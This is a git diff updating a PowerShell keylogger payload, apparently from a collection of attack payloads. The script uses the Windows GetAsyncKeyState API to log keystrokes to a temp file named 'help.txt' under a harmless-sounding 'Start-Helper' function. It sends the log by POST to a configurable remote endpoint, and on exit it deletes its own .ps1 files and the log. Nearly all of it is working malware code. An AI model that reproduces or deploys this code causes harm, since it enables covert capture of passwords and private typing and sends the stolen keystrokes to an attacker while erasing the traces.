Update Keylogger script and stuffs

+++ payloads/keylogger/keylog_ps/helper_post.ps1
@@ -1,6 +1,6 @@
-$TimesToRun = 20                      	# How many times to run the script.
-$RunTimeP = 0.1                        	# Runtime in minutes for each run.
-$endpoint = "http://192.168.66.2/server"  # Address to send the file to.
+$TimesToRun = 2					# How many successful runs to achieve.
+$RunTimeP = 0.5					# Runtime in minutes for each run.
+$endpoint = "ADDRESS_TO_POST_LOGS_TO"		# Address to send the file to.
 
 # Requires -Version 2
 function Start-Helper($Path = "$env:temp\help.txt") 
@@ -17,15 +17,18 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 '@
 
   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+  New-Item -Path $Path -ItemType File -Force
+
+  $successfulRuns = 0
 
   try {
-    for ($Runner = 1; $Runner -le $TimesToRun; $Runner++) {
+    while ($successfulRuns -lt $TimesToRun) {
       $TimeStart = Get-Date
       $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
 
       while ($TimeNow -le $TimeEnd) {
         Start-Sleep -Milliseconds 40
-        $fileCreated = $false  # Flag to track if the file is created in this loop.
+        $fileCreated = $false
 
         for ($ascii = 9; $ascii -le 254; $ascii++) {
           $state = $API::GetAsyncKeyState($ascii)
@@ -53,20 +56,22 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
         $TimeNow = Get-Date
       }
 
-      Invoke-WebRequest -Uri $endpoint -Method POST -ContentType 'text/plain' -InFile $Path
-      Remove-Item -Path $Path -Force
-
-      # Create an empty file if the script continues.
-      # As if there are no file, the POST request will fail and the script will finish.
-      if ($Runner -lt $TimesToRun) {
-        New-Item -Path $Path -ItemType File -Force
+      if ((Get-Content -Path $Path) -match '\S') {
+        Invoke-WebRequest -Uri $endpoint -Method POST -ContentType 'text/plain' -InFile $Path
+        Remove-Item -Path $Path -Force
+        $successfulRuns++
       }
+
+      New-Item -Path $Path -ItemType File -Force
     }
   }
   finally
   {
+        Remove-Item -Path $env:temp\*.ps1 -Force
+        Remove-Item -Path $Path -Force
     exit 1
   }
 }
 
 Start-Helper
+
